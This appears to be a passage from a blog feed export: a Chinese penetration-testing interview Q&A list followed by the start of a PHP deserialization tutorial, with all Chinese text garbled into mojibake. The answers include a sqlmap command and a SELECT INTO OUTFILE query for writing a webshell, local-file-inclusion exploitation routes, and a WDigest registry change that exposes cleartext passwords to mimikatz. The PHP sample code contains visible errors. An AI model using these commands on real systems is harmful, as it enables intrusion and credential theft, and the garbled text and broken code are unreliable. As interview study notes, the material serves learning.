class="line"></span><br><span class="line">æ—¥å¿—getshell</span><br><span class="line"></span><br><span class="line">æ•°æ®åº“ææƒï¼š</span><br><span class="line">mysql-UOF,UDF </span><br><span class="line">sqlserver:XP_CMDSHELL,sp_oacreate</span><br><span class="line"></span><br><span class="line">cilentç«¯ä»»æ„æ–‡ä»¶è¯»å–ï¼ˆå¯¹æ–¹æœ‰æ•°æ®åº“å¤–è¿ï¼‰</span><br><span class="line"></span><br><span class="line">dnså¤–å¸¦</span><br></pre></td></tr></table></figure></li><li><p>å¦‚ä½•é€šè¿‡sqlæ³¨å…¥å†™shell,å†™shellçš„å‰ææ¡ä»¶æ˜¯ä»€ä¹ˆ?(â˜…â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å†™æ–‡ä»¶ï¼š</span><br><span class="line">selct &quot;shell&quot;  into  outfile  &quot;ç»å¯¹è·¯å¾„&quot;ï¼›</span><br><span class="line">sqlmap:</span><br><span class="line">sqlmap -u &quot;http://x.x.x.x/?id=x&quot; --file-write=&quot;/Users/guang/Desktop/shell.php&quot; --file-dest=&quot;/var/www/html/test/shell.php&quot;</span><br><span class="line"></span><br><span class="line">æ—¥å¿—getshell</span><br><span class="line"></span><br><span class="line">å‰ææ¡ä»¶ï¼š</span><br><span class="line">çŸ¥é“ç½‘ç«™ç‰©ç†è·¯å¾„</span><br><span class="line">é«˜æƒé™æ•°æ®åº“ç”¨æˆ·</span><br><span class="line">secure_file_priv ä¸ºç©º</span><br></pre></td></tr></table></figure></li><li><p>ä»‹ç»ä¸€ä¸‹XSSæ¼æ´çš„ç§ç±»ï¼Œdomå‹XSSå’Œåå°„XSSçš„åŒºåˆ«æ˜¯ä»€ä¹ˆ?(â˜…â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åå°„å‹ï¼Œå­˜å‚¨å‹ï¼Œdomå‹</span><br><span class="line">domå‹ä¸åç«¯æ— å…³åªç»è¿‡å‰ç«¯ï¼Œåå°„å‹éœ€è¦å’Œåç«¯äº¤äº’</span><br></pre></td></tr></table></figure></li><li><p>å¦‚ä½•é˜²èŒƒ XSS æ¼æ´ï¼Œåœ¨å‰ç«¯å¦‚ä½•åšï¼Œåœ¨åç«¯å¦‚ä½•åšï¼Œå“ªé‡Œæ›´å¥½ï¼Œä¸ºä»€ä¹ˆï¼Ÿ(â˜…â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">htmlå®ä½“è½¬ä¹‰</span><br></pre></td></tr></table></figure></li><li><p>è®²è¿°ä¸€ä¸‹æ‰¾å›å¯†ç å¯èƒ½æ¶‰åŠçš„é€»è¾‘æ¼æ´(â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯ä»¥é‡ç½®ä»»æ„ç”¨æˆ·å¯†ç </span><br></pre></td></tr></table></figure></li><li><p>å‡è®¾ä½ æ˜¯ç”²æ–¹çš„ä¸€åå®‰å…¨å·¥ç¨‹å¸ˆï¼Œåº”è¯¥å¦‚ä½•é™ä½é€»è¾‘æ¼æ´çš„å‡ºç°ç‡?(â˜…â˜…)</p></li><li><p>oauthè®¤è¯è¿‡ç¨‹ä¸­å¯èƒ½ä¼šå‡ºç°ä»€ä¹ˆé—®é¢˜ï¼Œå¯¼è‡´ä»€ä¹ˆæ ·çš„æ¼æ´?(â˜…)</p></li><li><p>CSPåº”è¯¥å¦‚ä½•ä½¿ç”¨åŠé…ç½®ï¼Œæœ‰å“ªäº›ç»•è¿‡CSPçš„æ–¹å¼(â˜…â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p>å·²çŸ¥æŸç½‘ç«™å­˜åœ¨LFI(æœ¬åœ°æ–‡ä»¶åŒ…å«)ï¼Œä½†æ˜¯æ— æ³•ä¸Šä¼ ä»»ä½•æ–‡ä»¶ï¼Œé’ˆå¯¹è¯¥æƒ…å†µæœ‰å“ªäº›åˆ©ç”¨æ–¹å¼?(â˜…â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ—¥å¿—åŒ…å«</span><br><span class="line">cve-phpmyadminï¼ŒåŒ…å«æ•°æ®åº“æ–‡ä»¶</span><br><span class="line">php-sessionæ–‡ä»¶/ä¸´æ—¶æ–‡ä»¶åŒ…å«ï¼ˆæ¡ä»¶ç«äº‰ï¼‰</span><br><span class="line">docker-pearcmd.php å†™ğŸ</span><br></pre></td></tr></table></figure></li><li><p>ç®€è¿°ä¸€ä¸‹XXEæ¼æ´äº§ç”Ÿçš„åŸç†ï¼Œé’ˆå¯¹PHPå’ŒJAVAï¼ŒXXEåˆ†åˆ«å¯ä»¥è¿›è¡Œå“ªäº›æ¶æ„åˆ©ç”¨?(â˜…â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¼•å…¥å¤–éƒ¨æ¶æ„å®ä½“ï¼Œæ”¯æŒå¦‚ä¸‹åè®®</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230506225044953-1686810531410.png" alt="image-20230506225044953"></p></li></ul><h2 id="PHPå®‰å…¨"><a href="#PHPå®‰å…¨" class="headerlink" title="PHPå®‰å…¨"></a>PHPå®‰å…¨</h2><ul><li><p>PHPä¸­å¦‚ä½•ä½¿ç”¨<code>phar://</code>ä¼ªåè®®è§¦å‘ååºåˆ—åŒ–ï¼Œåˆ©ç”¨åœºæ™¯ä»¥åŠå‰ææ¡ä»¶æœ‰å“ªäº›?(â˜…â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ–‡ä»¶æ“ä½œå‡½æ•°è§¦å‘</span><br><span class="line">å‰ææ¡ä»¶ï¼šç›®æ ‡å¼€å¯pharæ‰©å±•,å­˜åœ¨å±é™©çš„ç±»å’Œæ–¹æ³•</span><br></pre></td></tr></table></figure></li><li><p>å¦‚ä½•ç»•è¿‡<code>php.ini</code>ä¸­<code>disable_function</code>çš„é™åˆ¶ï¼Œæœ‰å“ªäº›æ–¹æ³•ï¼Œå…¶ä¸­æˆåŠŸç‡æœ€é«˜çš„æ–¹æ³•æ˜¯å“ªä¸ªï¼Œä¸ºä»€ä¹ˆ?(â˜…â˜…â˜…)</p><p><a href="https://www.freebuf.com/articles/network/263540.html">https://www.freebuf.com/articles/network/263540.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshellç®¡ç†å·¥å…·éƒ½è‡ªå¸¦äº†ç»•è¿‡disable_functionçš„åŠŸèƒ½</span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶ä¸Šä¼ ä¸­<code>%00</code>æˆªæ–­çš„åŸç†æ˜¯ä»€ä¹ˆï¼Œå®˜æ–¹æ˜¯å¦‚ä½•è®¾è®¡ä¿®å¤æ–¹æ¡ˆçš„?(â˜…â˜…)</p><p><img src="/../images/image-20230615144441227.png" alt="image-20230615144441227"></p><p><img src="/../images/image-20230615144248486.png" alt="image-20230615144248486"></p></li><li><p>å®ç°ä¸€ä¸ªä¸€å¥è¯webshellï¼Œç»•è¿‡RASPçš„æ–¹å¼æœ‰å“ªäº›ï¼Œç»•è¿‡æœºå™¨å­¦ä¹ æ£€æµ‹çš„æ–¹å¼æœ‰å“ªäº›ï¼Œç»•è¿‡AST-Treeçš„æ–¹å¼æœ‰å“ªäº›(â˜…â˜…)</p></li><li><p>PHPä¼ªåè®®çš„æ”»å‡»åœºæ™¯æœ‰å“ªäº›ï¼Ÿ(â˜…â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ–‡ä»¶åŒ…å«ï¼šè¯»å–æºç </span><br><span class="line">pharååºåˆ—åŒ–</span><br><span class="line">ä½¿ç”¨filterè¿‡æ»¤å™¨æ„é€ webshell</span><br></pre></td></tr></table></figure></li><li><p><code>mail</code>å‡½æ•°çš„æ”»å‡»é¢æœ‰å“ªäº›?(â˜…)</p></li><li><p>å¦‚ä½•ä¸é€šè¿‡æ•°å­—ä»¥åŠå­—ç¬¦æ„é€ webshellï¼Œå…¶åŸç†æ˜¯ä»€ä¹ˆï¼Œæ­¤ç±»ç‰¹æ€§è¿˜ä¼šé€ æˆä»€ä¹ˆå®‰å…¨é—®é¢˜?(â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpç‰¹æ€§ï¼Œæ”¯æŒå­—æ¯è‡ªå¢</span><br></pre></td></tr></table></figure></li></ul><h2 id="JAVAå®‰å…¨"><a href="#JAVAå®‰å…¨" class="headerlink" title="JAVAå®‰å…¨"></a>JAVAå®‰å…¨</h2><ul><li><p><code>ClassLoader</code>æ˜¯ä»€ä¹ˆ? åŠ è½½è‡ªå®šä¹‰<code>ClassLoader</code>çš„å‰ææ˜¯ä»€ä¹ˆ? (â˜…)</p></li><li><p>å¤§æ¦‚è®²ä¸€ä¸‹<code>CommonCollections1</code>çš„åˆ©ç”¨é“¾ï¼Œè¯¥åˆ©ç”¨é“¾æœ‰ä»€ä¹ˆæ ·çš„é™åˆ¶? (â˜…â˜…)</p></li><li><p>fastjsonçš„ååºåˆ—åŒ–å’ŒåŸç”Ÿååºåˆ—åŒ–æ¼æ´çš„åŒºåˆ«æ˜¯ä»€ä¹ˆ? (â˜…â˜…)</p><p><img src="/../images/image-20230615145147923.png" alt="image-20230615145147923"></p></li><li><p>åœ¨tomcatä¸­å®ç°å†…å­˜é©¬æœ‰å“ªäº›æ–¹å¼ï¼Œæœ‰åŠæ³•å®ç°é‡å¯ä¹‹åä¾ç„¶ä¸ä¼šæ¶ˆå¤±çš„å†…å­˜é©¬å—? (â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">listen</span><br><span class="line">filter</span><br><span class="line">servlet</span><br></pre></td></tr></table></figure></li><li><p>å•å‘ä»£ç æ‰§è¡Œé“¾å¦‚ä½•å®ç°æ‰§è¡Œå¤šæ¡è¯­å¥ï¼Œå¦‚<code>CommonCollections1</code> (â˜…)</p></li><li><p>è¯·ç®€å•è®²è¿°ä¸€ä¸‹Shiroååºåˆ—åŒ–æ¼æ´çš„åŸç†ï¼Œæ— æ³•ä½¿ç”¨ysoerialä¸­common-collectionsåˆ©ç”¨é“¾çš„åŸå› æ˜¯ä»€ä¹ˆ? (â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shiroæ¡†æ¶æä¾›äº†ä¸€ä¸ªremember meçš„åŠŸèƒ½ï¼Œä¼šå¯¹cookieä¸­çš„remember meçš„å€¼è¿›è¡Œbase64è§£ç ï¼Œaesè§£å¯†ï¼Œååºåˆ—åŒ–  åªè¦èƒ½æ‰¾åˆ°aesçš„å¯†é’¥å°±å¯ä»¥æ„é€ æ¶æ„åºåˆ—åŒ–å†…å®¹ã€‚550å¯†é’¥ç¡¬ç¼–ç ï¼Œ721ç”¨äºåŠ å¯†rememberMe Cookieçš„ç®—æ³•AES-128-CBCå­˜åœ¨ç¼ºé™· ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡Padding Oracle æ„é€ å‡ºä»»æ„åºåˆ—åŒ–æ•°æ®çš„æœ‰æ•ˆå¯†æ–‡ï¼Œä»è€Œå®æ–½ååºåˆ—åŒ–æ”»å‡»ã€‚</span><br><span class="line"></span><br><span class="line">åˆ©ç”¨é“¾é™åˆ¶</span><br><span class="line">https://paper.seebug.org/1285/#_4</span><br></pre></td></tr></table></figure></li><li><p>å†°èå½“ä¸­é€šè¿‡Javaè”åŠ¨<code>Cobalt Strike</code>ä¸Šçº¿çš„åŸç†æ˜¯ä»€ä¹ˆ? (â˜…)</p></li><li><p><code>serialVersionUID</code> åœ¨ååºåˆ—åŒ–ä¸­çš„ä½œç”¨æ˜¯ä»€ä¹ˆ? (â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Javaçš„åºåˆ—åŒ–æœºåˆ¶æ˜¯é€šè¿‡åœ¨è¿è¡Œæ—¶åˆ¤æ–­ç±»çš„serialVersionUIDæ¥éªŒè¯ç‰ˆæœ¬ä¸€è‡´æ€§çš„ã€‚åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼ŒJVMä¼šæŠŠä¼ æ¥çš„å­—èŠ‚æµä¸­çš„serialVersionUIDä¸æœ¬åœ°ç›¸åº”å®ä½“ï¼ˆç±»ï¼‰çš„serialVersionUIDè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸åŒå°±è®¤ä¸ºæ˜¯ä¸€è‡´çš„ï¼Œå¯ä»¥è¿›è¡Œååºåˆ—åŒ–ï¼Œå¦åˆ™å°±ä¼šå‡ºç°åºåˆ—åŒ–ç‰ˆæœ¬ä¸ä¸€è‡´çš„å¼‚å¸¸ã€‚ </span><br></pre></td></tr></table></figure></li></ul><h2 id="Linuxç›¸å…³"><a href="#Linuxç›¸å…³" class="headerlink" title="Linuxç›¸å…³"></a>Linuxç›¸å…³</h2><ul><li>ç®€è¿°ä¸€ä¸‹å®ˆæŠ¤è¿›ç¨‹çš„æ¦‚å¿µï¼Œå¦‚ä½•ç”Ÿæˆä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹? (â˜…)</li><li>Linux æœåŠ¡å™¨çš„å®‰å…¨è¿ç»´æ“ä½œæœ‰å“ªäº›ï¼Ÿå¦‚ä½•ä¿æŠ¤ SSHï¼Ÿ(â˜…â˜…)</li><li>å…¥ä¾µ Linux æœåŠ¡å™¨åéœ€è¦æ¸…é™¤å“ªäº›æ—¥å¿—ï¼Ÿ(â˜…â˜…)</li><li>åå¼¹ shell çš„å¸¸ç”¨å‘½ä»¤ï¼Ÿä¸€èˆ¬å¸¸åå¼¹å“ªä¸€ç§ shellï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ(â˜…â˜…â˜…)</li><li>ä»ä¸»æœºçš„å±‚é¢ï¼Œåå¼¹shellå¦‚ä½•ç›‘æ§ (â˜…â˜…â˜…)</li><li>Rootkitçš„ç§ç±»æœ‰å“ªäº›ï¼Œé’ˆå¯¹ä¸åŒç§ç±»çš„Rootkitåº”è¯¥å¦‚ä½•é˜²æŠ¤ä»¥åŠæ£€æµ‹ (â˜…â˜…)</li><li>Aè´¦æˆ·åˆ›å»ºäº†æƒé™ä¸º766çš„æ–‡ä»¶å¤¹<code>adir</code>ï¼Œè¯¥æ–‡ä»¶å¤¹ä¸­æœ‰Bè´¦æˆ·çš„æ–‡ä»¶<code>password.txt</code>ï¼Œæƒé™ä¸ºBè´¦æˆ·çš„700ï¼Œè¯·é—®Bè´¦æˆ·èƒ½å¦è¯»å–åˆ°<code>adir/password.txt</code>æ–‡ä»¶çš„å†…å®¹ (â˜…)</li><li>sshè½¯é“¾æ¥åé—¨çš„åŸç†æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥é€šè¿‡è¯¥åŸç†æ„é€ å…¶ä»–åé—¨å—?(â˜…)</li><li>Linuxä¸­forkçš„åŸç†æ˜¯ä»€ä¹ˆï¼Œå­è¿›ç¨‹ä¸€å®šä¼šæ‹·è´çˆ¶è¿›ç¨‹çš„èµ„æºçŠ¶æ€å—ï¼Ÿ(â˜…â˜…)</li><li>å®ç°R3å±‚HOOKçš„æ–¹å¼æœ‰å“ªäº›ï¼ŒR0å±‚çš„HOOKåˆæœ‰å“ªäº›? (â˜…)</li><li>Linuxä¸‹å¦‚ä½•å‡†ç¡®å®ç°åº”ç”¨è¯†åˆ«ï¼Œå¦‚è¯†åˆ«<code>nginx</code> <code>mysql</code>ç­‰ (â˜…)</li><li>å‡è®¾æŸLinuxæœºå™¨å­˜åœ¨å‘½ä»¤å®¡è®¡(æ–¹æ³•æœªçŸ¥)ï¼Œæœ‰å“ªäº›å¯èƒ½çš„ç»•è¿‡æ–¹æ³•? (â˜…â˜…)</li><li>Linuxå¸¸è§çš„ææƒæ–¹æ³•æœ‰å“ªäº›?(â˜…â˜…)</li><li>åƒµå°¸è¿›ç¨‹å’Œå­¤å„¿è¿›ç¨‹çš„åŒºåˆ«æ˜¯ä»€ä¹ˆ? (â˜…)</li></ul><h2 id="Windowsç›¸å…³"><a href="#Windowsç›¸å…³" class="headerlink" title="Windowsç›¸å…³"></a>Windowsç›¸å…³</h2><ul><li>UACæ˜¯å¦‚ä½•è¿›è¡Œé‰´æƒæ ¡éªŒçš„? BypassUACçš„å¸¸è§æ–¹æ³•æœ‰å“ªäº›? (â˜…â˜…)</li><li>SSDTè¡¨æ˜¯ä»€ä¹ˆï¼Œå¦‚ä½•åœ¨ç³»ç»Ÿä¸­æ‰¾åˆ°SSDTè¡¨å¹¶è¿›è¡Œhook? (â˜…)</li><li>Windowsæ˜¯å¦‚ä½•è¿›è¡Œæƒé™æ§åˆ¶çš„ï¼Œå…·ä½“çš„æƒé™æ ¡éªŒæ¨¡å‹æ˜¯ä»€ä¹ˆ? (â˜…)</li></ul><h2 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h2><ul><li><p>psexecçš„åº•å±‚å®ç°åŸç†æ˜¯ä»€ä¹ˆ? (â˜…)</p><p>è¿™æ¬¾å·¥å…·çš„åˆè¡·æ˜¯å¸®åŠ©ç®¡ç†å‘˜ç®¡ç†å¤§é‡çš„æœºå™¨çš„ï¼Œåæ¥è¢«æ”»å‡»è€…ç”¨æ¥åšæ¨ªå‘æ¸—é€ã€‚</p><p><a href="https://tttang.com/archive/1710/#toc_psexec">https://tttang.com/archive/1710/#toc_psexec</a></p><p><a href="https://payloads.online/archivers/2020-04-02/1/">https://payloads.online/archivers/2020-04-02/1/</a></p><p><img src="/../images/image-20230601133356646.png" alt="image-20230601133356646"></p></li><li><p>SSPæ¥å£ä¸­ä¿®å¤äº†å“ªä¸ªæ¨¡å—æœç»äº†mimikatzçš„æ¶æ„åˆ©ç”¨ï¼Œå…·ä½“æ˜¯å¦‚ä½•ä¿®å¤çš„ï¼Ÿ(â˜…â˜…)</p></li><li><p>å†…ç½‘KDCæœåŠ¡å™¨å¼€æ”¾åœ¨å“ªä¸ªç«¯å£ï¼Œé’ˆå¯¹kerboresçš„æ”»å‡»æœ‰å“ªäº›? (â˜…â˜…â˜…)</p></li><li><p>åœ¨win10æˆ–è€…winserver2012ä¸­ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨mimikatzï¼Œè¯¥å¦‚ä½•ä½¿ç”¨ï¼Œä¿®æ”¹æ³¨å†Œè¡¨åå¦‚ä½•åœ¨ä¸é‡å¯æœºå™¨çš„æƒ…å†µä¸‹è·å–NTLM? (â˜…â˜…)</p></li><li><p>åŸŸå†…å¦‚ä½•æŸ¥è¯¢å‘˜å·¥å¯¹åº”çš„æœºå™¨? (â˜…)</p></li><li><p>å¦‚ä½•æŸ¥è¯¢åŸŸä¹‹é—´çš„ä¿¡ä»»å…³ç³»? (â˜…)</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nltest /domain_trusts /all_trusts /v /server:&lt;åŸŸæ§ip&gt;    //æŸ¥è¯¢ä¿¡ä»»åŸŸ</span><br></pre></td></tr></table></figure><p><img src="/../images/c7327514d30658e4bc2f76366a1d568d.png" alt="img"></p></li><li><p>åŸŸæ§å¼€æ”¾çš„å¸¸è§ç«¯å£æœ‰å“ªäº›?(â˜…)</p></li><li><p>windowså†…ç½‘ä¸­ntlmåè®®è®¤è¯è¿‡ç¨‹ (â˜…â˜…â˜…)</p><p><a href="https://ares-x.com/2020/03/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/">https://ares-x.com/2020/03/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/</a></p></li><li><p>cobalt strikeä¸­ä¸Šçº¿æ–¹å¼æœ‰å“ªäº›ï¼Œå„è‡ªæ˜¯ä»€ä¹ˆåŸç†ï¼Œå¦‚æœéœ€è¦ç»•è¿‡ç›‘æ§ï¼Œå¦‚ä½•ç»•? (â˜…â˜…)</p></li><li><p>æ¨ªå‘æ¸—é€ä¸­ï¼Œwmicå¦‚ä½•æ„é€ æœ‰å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œ? (â˜…â˜…)</p></li><li><p>windowsåº”æ€¥å“åº”ä¸­ï¼Œéœ€è¦æŸ¥çœ‹å“ªäº›å®‰å…¨æ—¥å¿—IDï¼Œåˆ†åˆ«å¯¹åº”å“ªäº›æ”»é˜²åœºæ™¯ï¼Œå¦‚æœè¯¥windowsä¸»æœºä¸ºåŸŸæ§ï¼Œåˆåº”è¯¥æŸ¥çœ‹å“ªäº›äº‹ä»¶æ—¥å¿—? (â˜…â˜…â˜…)</p></li><li><p>golden ticketå’Œsliver ticketçš„åŒºåˆ«æ˜¯ä»€ä¹ˆ? (â˜…â˜…â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»„é‡‘ç¥¨æ®ï¼Œè·å–KDCç”¨æˆ·ï¼ˆkrbtgç”¨æˆ·çš„hashå€¼ï¼‰å°±å¯ä»¥ä¼ªé€ ä»»æ„ç”¨æˆ·çš„é»„é‡‘ç¥¨æ®ä»è€Œå®ç°å¯¹åŸŸå†…ä»»æ„æœºå™¨çš„ä¸€ä¸ªè®¿é—®ã€‚</span><br><span class="line"></span><br><span class="line">ç™½é“¶ç¥¨æ®ï¼Œå½“è·å–åˆ°åŸŸå†…æœºå™¨ç”¨æˆ·çš„hashå€¼å°±å¯ä»¥ä¼ªé€ ä¸€ä¸ªçœŸæ­£çš„ç™½é“¶ç¥¨æ®ã€‚å®ç°å¯¹æŸä¸ªæœºå™¨ç‰¹å®šæœåŠ¡çš„è®¿é—®ã€‚</span><br><span class="line"></span><br><span class="line">ä»–ä»¬ä¸¤ä¸ªåŒºåˆ«å°±åœ¨é»„é‡‘ç¥¨æ®ä½œç”¨æ›´å¤§è·å¾—TGTç¥¨æ®åå¯ä»¥è®¿é—®ä»»æ„æœºå™¨ä»»æ„æœåŠ¡ï¼Œç™½é“¶åªèƒ½æŒ‡å®šæœºå™¨æŒ‡å®šæœåŠ¡ã€‚</span><br></pre></td></tr></table></figure></li><li><p>sliver ticketåˆ©ç”¨çš„å‰ç½®æ¡ä»¶æ˜¯ä»€ä¹ˆ?(â˜…)</p></li><li><p>åœ¨éåŸŸä¸»æœºçš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•å¿«é€Ÿå‘ç°åŸŸä¸»æœºï¼Ÿ (â˜…â˜…)</p></li><li><p>mimikatzçš„åŸç†ï¼Œå“ªä¸ªè¡¥ä¸å¯¼è‡´äº†mimikatzæ— æ³•åˆ©ç”¨ï¼Œå¦‚ä½•ç»•è¿‡? (â˜…â˜…)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å®‰è£…äº†KB2871997è¡¥ä¸æˆ–è€…ç³»ç»Ÿç‰ˆæœ¬å¤§äºwindows server 2012æ—¶ï¼Œlsass.exeä¸ä¿å­˜æ˜æ–‡å¯†ç ä¸ä¿å­˜æ˜æ–‡çš„å¯†ç ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å¯ç”¨Wdigest Authï¼Œå†…å­˜ä¸­è¿˜æ˜¯ä¼šä¿å­˜ç³»ç»Ÿçš„æ˜æ–‡å£ä»¤</span><br><span class="line">å°†ä¸‹åˆ—æ³¨å†Œè¡¨è·¯å¾„çš„</span><br><span class="line">HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest</span><br><span class="line">ä»¥ä¸‹é¡¹çš„</span><br><span class="line">UseLogonCredential</span><br><span class="line">å€¼ä¿®æ”¹æˆ0æˆ–1</span><br><span class="line">0ï¼šå…³é—­Wdigest Auth</span><br><span class="line">1ï¼šå¯åŠ¨Wdigest Auth</span><br></pre></td></tr></table></figure></li><li><p>æœ‰æ²¡æœ‰åŠæ³•åœ¨ä¸é‡å¯æœºå™¨çš„å‰æä¸‹å¯ç”¨wdigestè¿™ä¸ªSSPI? (â˜…)</p></li><li><p>NTLM relayçš„æ”»å‡»åœºæ™¯æœ‰å“ªäº›ï¼Œä½¿ç”¨NTLM relayä¼šå—åˆ°å“ªäº›é™åˆ¶? (â˜…)</p></li><li><p>windowsä¸­å¦‚ä½•é‰´åˆ«ç”¨æˆ·èº«ä»½? SIDæ˜¯ä»€ä¹ˆ? åŸºäºSIDçš„SID Historyæ”»å‡»åŸç†æ˜¯ä»€ä¹ˆ? (â˜…)</p></li><li><p>å‡è®¾æ‹¿åˆ°äº†æŸå°åŸŸæœºå™¨çš„æƒé™ï¼Œä½†æ˜¯æœºå™¨ä¸Šå¹¶æ²¡æœ‰åŸŸè´¦æˆ·ï¼Œåº”è¯¥å¦‚ä½•è¿›è¡ŒåŸŸæ¸—é€? (â˜…â˜…)</p></li><li><p>åŸŸçš„åˆå§‹åŒ–é…ç½®å…è®¸ä»»ä½•åŸŸç”¨æˆ·ç™»å½•ä»»æ„åŠ äº†åŸŸçš„æœºå™¨ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆ? (â˜…)</p></li><li><p>å¦‚ä½•æŸ¥è¯¢åŸŸç®¡ç™»å½•è¿‡çš„æœºå™¨ï¼ŒæŸ¥è¯¢åŸç†åˆæ˜¯ä»€ä¹ˆ? (â˜…)</p></li></ul><h2 id="å…¶ä»–å®‰å…¨ç›¸å…³"><a href="#å…¶ä»–å®‰å…¨ç›¸å…³" class="headerlink" title="å…¶ä»–å®‰å…¨ç›¸å…³"></a>å…¶ä»–å®‰å…¨ç›¸å…³</h2><ul><li>RSAåŠ è§£å¯†æµç¨‹(â˜…)</li><li>HTTPSæ˜¯å¦‚ä½•å®ç°çš„(â˜…â˜…)</li><li>å¦‚ä½•é˜²æŠ¤è¿è¥å•†çš„DNSåŠ«æŒ&#x2F;é“¾è·¯åŠ«æŒ(â˜…â˜…)</li><li>å¦‚ä½•é˜²èŒƒç¾Šæ¯›å…š?(â˜…)</li><li>ä¸€ä¸ªå¤§èŒƒå›´å½±å“çš„0dayè¢«æ›å…‰ï¼Œä½œä¸ºç”²æ–¹å®‰å…¨å·¥ç¨‹å¸ˆï¼Œåº”è¯¥å¦‚ä½•å¤„ç†(â˜…â˜…)</li></ul>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPååºåˆ—åŒ–</title>
      <link href="/2023/05/31/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/05/31/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h1><p>åºåˆ—åŒ–æ˜¯å°†å¯¹è±¡è½¬åŒ–ä¸ºæ•°æ®å­—èŠ‚æµï¼Œååºåˆ—åŒ–æ˜¯å°†æ•°æ®å­—èŠ‚æµè½¬æ¢æˆå¯¹è±¡ã€‚</p><p>ä¾‹å¦‚javaé‡‡ç”¨äºŒè¿›åˆ¶åºåˆ—ï¼ŒPHPé‡‡ç”¨å¯è§å­—ç¬¦ä¸²åºåˆ—ã€‚</p><h1 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h1><h2 id="éç±»åºåˆ—åŒ–"><a href="#éç±»åºåˆ—åŒ–" class="headerlink" title="éç±»åºåˆ—åŒ–"></a>éç±»åºåˆ—åŒ–</h2><p>ç›¸æ¯”äºç±»åºåˆ—åŒ–å°‘äº†å¯¹è±¡åé•¿åº¦å’Œå¯¹è±¡åç§°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span>\n&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>=&gt;<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span></span><br><span class="line">&gt;&gt;a:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;i:<span class="number">1</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;i:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="ç±»åºåˆ—åŒ–"><a href="#ç±»åºåˆ—åŒ–" class="headerlink" title="ç±»åºåˆ—åŒ–"></a>ç±»åºåˆ—åŒ–</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    pubilc <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        this-&gt;name = <span class="number">18</span></span><br><span 